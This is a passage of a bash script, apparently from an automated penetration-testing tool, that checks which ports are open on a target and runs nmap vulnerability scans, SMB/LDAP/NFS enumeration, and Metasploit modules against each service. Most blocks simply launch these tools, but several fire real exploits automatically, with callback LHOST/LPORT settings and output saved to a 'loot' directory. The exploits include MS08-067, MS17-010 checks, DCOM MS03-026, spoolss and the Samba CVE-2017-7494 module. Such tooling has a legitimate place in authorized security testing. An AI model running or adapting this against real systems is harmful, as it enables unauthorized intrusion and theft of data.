    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=dns*,/usr/share/nmap/scripts/vulners -p 53 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port53.txt
  fi
fi

if [[ -z "$port_67" ]];
then
  echo -e "$OKRED + -- --=[Port 67 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 67 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sU -sV -Pn -v --script-timeout 90 --script=dhcp*,/usr/share/nmap/scripts/vulners -p 67 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port67.txt
  fi
fi

if [[ -z "$port_68" ]];
then
  echo -e "$OKRED + -- --=[Port 68 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 68 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sU -sV -Pn -v --script-timeout 90 --script=dhcp*,/usr/share/nmap/scripts/vulners -p 68 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port68.txt
  fi
fi

if [[ -z "$port_69" ]];
then
  echo -e "$OKRED + -- --=[Port 69 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 69 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sU -sV -Pn -v --script-timeout 90 --script=tftp*,/usr/share/nmap/scripts/vulners -p 69 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port69.txt
  fi
fi

if [[ -z "$port_79" ]];
then
  echo -e "$OKRED + -- --=[Port 79 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 79 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=finger*,/usr/share/nmap/scripts/vulners -p 79 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port79.txt
  fi
fi

if [[ -z "$port_110" ]];
then
  echo -e "$OKRED + -- --=[Port 110 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 110 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -v --script-timeout 90 --script=pop*,/usr/share/nmap/scripts/vulners -p 110 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port110.txt
  fi
fi

if [[ -z "$port_111" ]];
then
  echo -e "$OKRED + -- --=[Port 111 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 111 opened... running tests...$RESET"
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw > $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw 2> /dev/null
  fi
  if [[ "$SHOW_MOUNT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING SHOW MOUNT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    showmount -a $TARGET | tee $LOOT_DIR/output/showmount-$TARGET-port111a.txt
    showmount -d $TARGET | tee $LOOT_DIR/output/showmount-$TARGET-port111d.txt
    showmount -e $TARGET | tee $LOOT_DIR/output/showmount-$TARGET-port111e.txt
  fi
fi

if [[ -z "$port_123" ]];
then
  echo -e "$OKRED + -- --=[Port 123 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 123 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sU -sV -Pn -v --script-timeout 90 --script=ntp-*,/usr/share/nmap/scripts/vulners -p 123 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port123.txt
  fi
fi

if [[ -z "$port_135" ]];
then
  echo -e "$OKRED + -- --=[Port 135 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 135 opened... running tests...$RESET"
  if [[ "$RPC_INFO" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING RPCINFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    rpcinfo -p $TARGET | tee $LOOT_DIR/output/rpcinfo-$TARGET-port135.txt
  fi
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -p 135 -v --script-timeout 90 --script=rpc*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port135.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw > $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw 2> /dev/null
  fi
fi

if [[ -z "$port_137" ]];
then
  echo -e "$OKRED + -- --=[Port 137 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 137 opened... running tests...$RESET"
  if [[ "$RPC_INFO" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING RPCINFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    rpcinfo -p $TARGET | tee $LOOT_DIR/output/rpcinfo-$TARGET-port137.txt
  fi
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -p 137 -v --script-timeout 90 --script=broadcast-netbios-master-browser*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port137.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-nbname.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-nbname.raw > $LOOT_DIR/output/msf-$TARGET-nbname.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-nbname.raw 2> /dev/null
  fi
fi

if [[ -z "$port_139" ]];
then
  echo -e "$OKRED + -- --=[Port 139 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 139 opened... running tests...$RESET"
  SMB="1"
  if [[ "$SMB_ENUM" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING SMB ENUMERATION $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    enum4linux $TARGET | tee $LOOT_DIR/output/enum4linux-$TARGET-port139.txt
    python $SAMRDUMP $TARGET | tee $LOOT_DIR/output/samrdump-$TARGET-port139.txt
    nbtscan $TARGET | tee $LOOT_DIR/output/nbtscan-$TARGET-port139.txt
  fi
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV  -p139 -v --script-timeout 90 --script=smb*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port139.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port139.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port139.raw > $LOOT_DIR/output/msf-$TARGET-port139.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port139.raw 2> /dev/null
  fi
fi

if [[ -z "$port_161" ]];
then
  echo -e "$OKRED + -- --=[Port 161 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 161 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -v --script-timeout 90 --script=/usr/share/nmap/scripts/vulners,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 161 -sU -sT $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port161.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw > $LOOT_DIR/output/msf-$TARGET-snmp_enum.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw 2> /dev/null
  fi
fi

if [[ -z "$port_162" ]];
then
  echo -e "$OKRED + -- --=[Port 162 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 162 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -v --script-timeout 90 --script=/usr/share/nmap/scripts/vulners,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 162 -sU -sT $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port162.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw > $LOOT_DIR/output/msf-$TARGET-snmp_enum.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw 2> /dev/null
  fi
fi

if [[ -z "$port_264" ]];
then
  echo -e "$OKRED + -- --=[Port 264 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 264 opened... running tests...$RESET"

  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/gather/checkpoint_hostname; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-checkpoint_hostname.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-checkpoint_hostname.raw > $LOOT_DIR/output/msf-$TARGET-checkpoint_hostname.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-checkpoint_hostname.raw 2> /dev/null
  fi
fi

if [[ -z "$port_389" ]];
then
  echo -e "$OKRED + -- --=[Port 389 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 389 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -p 389 -Pn -v --script-timeout 90 --script=ldap*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port389.txt
  fi
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  echo -e "$OKRED RUNNING LDAP ANONYMOUS SEARCH QUERY $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  ldapsearch -h $TARGET 389 -x -s base -b '' "(objectClass=*)" "*" + | tee $LOOT_DIR/output/ldapsearch-$TARGET-port389.txt
fi

if [[ -z "$port_445" ]]; then
  echo -e "$OKRED + -- --=[Port 445 closed... skipping.$RESET"
elif [[ $SMB = "1" ]]; then
  echo -e "$OKRED + -- --=[Port 445 scanned... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 445 opened... running tests...$RESET"
  if [[ "$SMB_ENUM" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED ENUMERATING SMB/NETBIOS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    enum4linux $TARGET | tee $LOOT_DIR/output/enum4linux-$TARGET-port445.txt
    python $SAMRDUMP $TARGET | tee $LOOT_DIR/output/samrdump-$TARGET-port445.txt
    nbtscan $TARGET | tee $LOOT_DIR/output/nbtscan-$TARGET-port445.txt
  fi
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -p445 -v --script-timeout 90 --script=smb*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port445.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; use auxiliary/scanner/smb/smb_version; run; use auxiliary/scanner/smb/pipe_auditor; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use exploit/windows/smb/ms06_040_netapi; run; use exploit/windows/smb/ms05_039_pnp; run; use exploit/windows/smb/ms10_061_spoolss; run; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port445.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port445.raw > $LOOT_DIR/output/msf-$TARGET-port445.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port445.raw 2> /dev/null
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING SAMBA ARBITRARY MODULE LOAD CVE-2017-7494 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use linux/samba/is_known_pipename; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw > $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw 2> /dev/null
  fi
fi

if [[ -z "$port_500" ]];
then
  echo -e "$OKRED + -- --=[Port 500 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 500 opened... running tests...$RESET"
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING CISCO IKE KEY DISCLOSURE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/ike/cisco_ike_benigncertain; set RHOSTS "$TARGET"; set PACKETFILE /usr/share/metasploit-framework/data/exploits/cve-2016-6415/sendpacket.raw; set THREADS 24; set RPORT 500; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port500-cisco_ike_benigncertain.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port500-cisco_ike_benigncertain.raw > $LOOT_DIR/output/msf-$TARGET-port500-cisco_ike_benigncertain.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port500-cisco_ike_benigncertain.raw 2> /dev/null
  fi
fi

if [[ -z "$port_512" ]];
then
  echo -e "$OKRED + -- --=[Port 512 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 512 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -p 512 -v --script-timeout 90 --script=rexec*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port512.txt
  fi
fi

if [[ -z "$port_513" ]];
then
  echo -e "$OKRED + -- --=[Port 513 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 513 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -p 513 -v --script-timeout 90 --script=rlogin*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port513.txt
  fi
fi

if [[ -z "$port_514" ]];
then
  echo -e "$OKRED + -- --=[Port 514 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 514 opened... running tests...$RESET"
  if [[ "$AMAP" = "1" ]]; then
    amap $TARGET 514 -A
  fi
fi

if [[ -z "$port_1099" ]];
then
  echo -e "$OKRED + -- --=[Port 1099 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 1099 opened... running tests...$RESET"
  if [[ "$AMAP" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING AMAP $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    amap $TARGET 1099 -A
  fi
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -p 1099 -v --script-timeout 90 --script=rmi-*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port1099.txt
  fi
